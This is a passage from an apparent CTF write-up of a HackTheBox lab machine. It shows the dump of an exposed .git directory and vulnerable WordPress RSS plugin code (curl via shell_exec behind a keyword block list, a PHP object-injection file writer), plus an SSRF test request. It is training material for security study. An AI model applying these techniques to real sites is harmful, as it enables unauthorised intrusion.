+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-receive.sample <span class="o">[</span>200]                                                                           
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/update.sample <span class="o">[</span>200]                                                                                
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/info/exclude <span class="o">[</span>200]                                                                                       
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/prepare-commit-msg.sample <span class="o">[</span>200]                                                                    
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-push.sample <span class="o">[</span>200]                                                                              
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/index <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/objects/info/packs <span class="o">[</span>404]
+<span class="o">[</span>-] Finding refs/
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/HEAD <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/info/refs <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/ORIG_HEAD <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/FETCH_HEAD <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/config <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/logs/refs/remotes/origin/master <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/logs/HEAD <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/logs/refs/remotes/origin/HEAD <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/logs/refs/stash <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/logs/refs/heads/master <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/packed-refs <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/refs/heads/master <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/refs/stash <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/refs/remotes/origin/master <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/refs/remotes/origin/HEAD <span class="o">[</span>404] 
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/refs/wip/wtree/refs/heads/master <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/refs/wip/index/refs/heads/master <span class="o">[</span>404]
+<span class="o">[</span>-] Finding packs
+<span class="o">[</span>-] Finding objects
+<span class="o">[</span>-] Fetching objects
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/objects/00/00000000000000000000000000000000000000 <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://blog-dev.travel.htb/.git/objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f <span class="o">[</span>200]
+<span class="o">[</span>-] Running git checkout <span class="nb">.</span>
+</pre></table></code></div></div><p>Okay so we are <code class="language-plaintext highlighter-rouge">done</code> now whole the <code class="language-plaintext highlighter-rouge">repo</code> is dumped into the dir <code class="language-plaintext highlighter-rouge">blog-dev</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>➜  blog-dev git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls</span> <span class="nt">-la</span>
+total 24
+drwxr-xr-x 3 root root 4096 May 21 09:33 <span class="nb">.</span>
+drwxr-xr-x 4 root root 4096 May 21 09:33 ..
+drwxr-xr-x 7 root root 4096 May 21 09:36 .git
+<span class="nt">-rwxr-xr-x</span> 1 root root  540 May 21 09:33 README.md
+<span class="nt">-rwxr-xr-x</span> 1 root root 2970 May 21 09:33 rss_template.php
+<span class="nt">-rwxr-xr-x</span> 1 root root 1387 May 21 09:33 template.php
+</pre></table></code></div></div><p>If we run <code class="language-plaintext highlighter-rouge">git log</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
+Author: jane &lt;jane@travel.htb&gt;
+Date:   Tue Apr 21 01:34:54 2020 <span class="nt">-0700</span>
+
+    moved to git
+</pre></table></code></div></div><p>There is only 1 commit done by <code class="language-plaintext highlighter-rouge">jane</code> oh…we have a username i guess</p><p>So we got <code class="language-plaintext highlighter-rouge">three</code> files here</p><blockquote><p>README.md</p></blockquote><div class="language-markdown highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre><span class="gh"># Rss Template Extension</span>
+
+Allows rss-feeds to be shown on a custom wordpress page.
+
+<span class="gu">## Setup</span>
+<span class="p">
+*</span> <span class="sb">`git clone https://github.com/WordPress/WordPress.git`</span>
+<span class="p">*</span> copy rss_template.php &amp; template.php to <span class="sb">`wp-content/themes/twentytwenty`</span> 
+<span class="p">*</span> create logs directory in <span class="sb">`wp-content/themes/twentytwenty`</span> 
+<span class="p">*</span> create page in backend and choose rss_template.php as theme
+
+<span class="gu">## Changelog</span>
+<span class="p">
+-</span> temporarily disabled cache compression
+<span class="p">-</span> added additional security checks 
+<span class="p">-</span> added caching
+<span class="p">-</span> added rss template
+
+<span class="gu">## ToDo</span>
+<span class="p">
+-</span> finish logging implementation
+</pre></table></code></div></div><blockquote><p>rss_template.php</p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="cm">/*
+Template Name: Awesome RSS
+*/</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'template.php'</span><span class="p">);</span>
+<span class="nx">get_header</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+
+<span class="nt">&lt;main</span> <span class="na">class=</span><span class="s">"section-inner"</span><span class="nt">&gt;</span>
+	<span class="cp">&lt;?php</span>
+	<span class="k">function</span> <span class="nf">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
+     <span class="k">require_once</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">'/wp-includes/class-simplepie.php'</span><span class="p">;</span>	    
+     <span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>	  
+     <span class="nv">$data</span> <span class="o">=</span> <span class="nx">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+         <span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">handle_content_type</span><span class="p">();</span>
+         <span class="k">if</span> <span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">)</span> <span class="p">{</span>
+             <span class="nb">error_log</span><span class="p">(</span><span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
+             <span class="nv">$simplepie</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+             <span class="nv">$failed</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+         <span class="p">}</span>
+     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+         <span class="nv">$failed</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="k">return</span> <span class="nv">$simplepie</span><span class="p">;</span>
+ 	 <span class="p">}</span>
+
+ 	<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+		<span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span> 	
+		<span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 	
+ 	 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+ 	 	<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://www.travel.htb/newsfeed/customfeed.xml"</span><span class="p">;</span>
+ 	 <span class="p">}</span>
+ 	 <span class="nv">$feed</span> <span class="o">=</span> <span class="nx">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span> 
+     <span class="k">if</span> <span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">())</span>
+		<span class="p">{</span>
+			<span class="k">echo</span> <span class="s1">'&lt;div class="sp_errors"&gt;'</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+			<span class="k">echo</span> <span class="s1">'&lt;p&gt;'</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">())</span> <span class="o">.</span> <span class="s2">"&lt;/p&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+			<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="k">else</span> <span class="p">{</span>
+	<span class="cp">?&gt;</span>
+	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"chunk focus"</span><span class="nt">&gt;</span>
+		<span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"header"</span><span class="nt">&gt;</span>
+		<span class="cp">&lt;?php</span> 
+			<span class="nv">$link</span> <span class="o">=</span> <span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">get_link</span><span class="p">();</span>
+			<span class="nv">$title</span> <span class="o">=</span> <span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">get_title</span><span class="p">();</span>
+			<span class="k">if</span> <span class="p">(</span><span class="nv">$link</span><span class="p">)</span> 
+			<span class="p">{</span> 
+				<span class="nv">$title</span> <span class="o">=</span> <span class="s2">"&lt;a href='</span><span class="nv">$link</span><span class="s2">' title='</span><span class="nv">$title</span><span class="s2">'&gt;</span><span class="nv">$title</span><span class="s2">&lt;/a&gt;"</span><span class="p">;</span> 
+			<span class="p">}</span>
+			<span class="k">echo</span> <span class="nv">$title</span><span class="p">;</span>
+		<span class="cp">?&gt;</span>
+		<span class="nt">&lt;/h3&gt;</span>
+		<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">get_description</span><span class="p">();</span> <span class="cp">?&gt;</span>
+
+	<span class="nt">&lt;/div&gt;</span>
+	<span class="cp">&lt;?php</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">get_items</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
+		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"chunk"</span><span class="nt">&gt;</span>
+			<span class="nt">&lt;h4&gt;</span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get_permalink</span><span class="p">())</span> <span class="k">echo</span> <span class="s1">'&lt;a href="'</span> <span class="o">.</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get_permalink</span><span class="p">()</span> <span class="o">.</span> <span class="s1">'"&gt;'</span><span class="p">;</span> <span class="k">echo</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get_title</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get_permalink</span><span class="p">())</span> <span class="k">echo</span> <span class="s1">'&lt;/a&gt;'</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"footnote"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get_date</span><span class="p">(</span><span class="s1">'j M Y, g:i a'</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
+			<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get_content</span><span class="p">();</span> <span class="cp">?&gt;</span>
+			<span class="cp">&lt;?php</span>
+			<span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span> <span class="o">=</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">get_enclosure</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+			<span class="p">{</span>
+				<span class="k">echo</span> <span class="s1">'&lt;div align="center"&gt;'</span><span class="p">;</span>
+				<span class="k">echo</span> <span class="s1">'&lt;p&gt;'</span> <span class="o">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">embed</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+					<span class="s1">'audio'</span> <span class="o">=&gt;</span> <span class="s1">'./for_the_demo/place_audio.png'</span><span class="p">,</span>
+					<span class="s1">'video'</span> <span class="o">=&gt;</span> <span class="s1">'./for_the_demo/place_video.png'</span><span class="p">,</span>
+					<span class="s1">'mediaplayer'</span> <span class="o">=&gt;</span> <span class="s1">'./for_the_demo/mediaplayer.swf'</span><span class="p">,</span>
+					<span class="s1">'altclass'</span> <span class="o">=&gt;</span> <span class="s1">'download'</span>
+				<span class="p">))</span> <span class="o">.</span> <span class="s1">'&lt;/p&gt;'</span><span class="p">;</span>
+				<span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">get_link</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">get_type</span><span class="p">())</span>
+				<span class="p">{</span>
+					<span class="k">echo</span> <span class="s1">'&lt;p class="footnote" align="center"&gt;('</span> <span class="o">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">get_type</span><span class="p">();</span>
+					<span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">get_size</span><span class="p">())</span>
+					<span class="p">{</span>
+						<span class="k">echo</span> <span class="s1">'; '</span> <span class="o">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">get_size</span><span class="p">()</span> <span class="o">.</span> <span class="s1">' MB'</span><span class="p">;</span>
+					<span class="p">}</span>
+					<span class="k">echo</span> <span class="s1">')&lt;/p&gt;'</span><span class="p">;</span>
+				<span class="p">}</span>
+				<span class="k">if</span> <span class="p">(</span><span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">get_thumbnail</span><span class="p">())</span>
+				<span class="p">{</span>
+					<span class="k">echo</span> <span class="s1">'&lt;div&gt;&lt;img src="'</span> <span class="o">.</span> <span class="nv">$enclosure</span><span class="o">-&gt;</span><span class="na">get_thumbnail</span><span class="p">()</span> <span class="o">.</span> <span class="s1">'" alt="" /&gt;&lt;/div&gt;'</span><span class="p">;</span>
+				<span class="p">}</span>
+				<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="cp">?&gt;</span>
+
+		<span class="nt">&lt;/div&gt;</span>
+	<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
+<span class="nt">&lt;/main&gt;</span>
+
+<span class="c">&lt;!--
+DEBUG
+</span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
+  <span class="k">include</span><span class="p">(</span><span class="s1">'debug.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="c">
+--&gt;</span>
+
+<span class="cp">&lt;?php</span> <span class="nx">get_template_part</span><span class="p">(</span> <span class="s1">'template-parts/footer-menus-widgets'</span> <span class="p">);</span> <span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span>
+<span class="nx">get_footer</span><span class="p">();</span>
+</pre></table></code></div></div><blockquote><p>template.php</p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+
+<span class="cd">/**
+ Todo: finish logging implementation via TemplateHelper
+*/</span>
+
+<span class="k">function</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// this should be secure</span>
+	<span class="nv">$tmpUrl</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"file://"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"@"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-o"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-F"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+	<span class="c1">// preventing all localhost access</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>		
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">url_get_contents</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="o">.</span><span class="nv">$url</span><span class="p">;</span>
+	<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">private</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">init</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>    	
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="o">.</span><span class="s1">'/logs/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><h1 id="analysis-of-both-the-php-files">Analysis of both the php files</h1><blockquote><p><code class="language-plaintext highlighter-rouge">rss_template.php</code></p></blockquote><p>If we look carefully on the code of <code class="language-plaintext highlighter-rouge">rss_template.php</code> this the template for the <code class="language-plaintext highlighter-rouge">awesome_rss</code></p><p>And the home-page of the <code class="language-plaintext highlighter-rouge">blog.travel.htb</code> confirm it for us</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-6.png" alt="Awesome-rss" /></p><blockquote><p><strong>Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!</strong></p></blockquote><p>And there is a <code class="language-plaintext highlighter-rouge">parameter</code> that is used by <code class="language-plaintext highlighter-rouge">awesome_rss</code> we can see that in <code class="language-plaintext highlighter-rouge">rss_template</code></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+		<span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span> 	
+		<span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
+</pre></table></code></div></div><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+</pre></table></code></div></div><p>And the parameter will be <code class="language-plaintext highlighter-rouge">?custom_feed_url</code></p><blockquote><p><code class="language-plaintext highlighter-rouge">template.php</code></p></blockquote><p>If we look at its code there are some <code class="language-plaintext highlighter-rouge">interesting</code> parts</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="nf">url_get_contents</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="o">.</span><span class="nv">$url</span><span class="p">;</span>
+	<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>The function is <code class="language-plaintext highlighter-rouge">getting</code> the url that we specify in <code class="language-plaintext highlighter-rouge">?custom_rss=url</code> and it just make a curl request to it huh !! Interesting</p><p><strong>Lets Try it on my side</strong></p><h2 id="getting-reponse-from-the-server">Getting reponse from the server</h2><p>I will make a <code class="language-plaintext highlighter-rouge">request</code> using <strong>curl</strong> on the following url</p><blockquote><p>http://blog.travel.htb/awesome-rss/?custom_feed_url=my_ip</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>curl <span class="s2">"http://blog.travel.htb/awesome-rss/?custom_feed_url=10.10.14.9"</span> <span class="o">&gt;</span> /dev/null
+</pre></table></code></div></div><p>And on my <code class="language-plaintext highlighter-rouge">ncat</code> listener i got response back…Yay!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
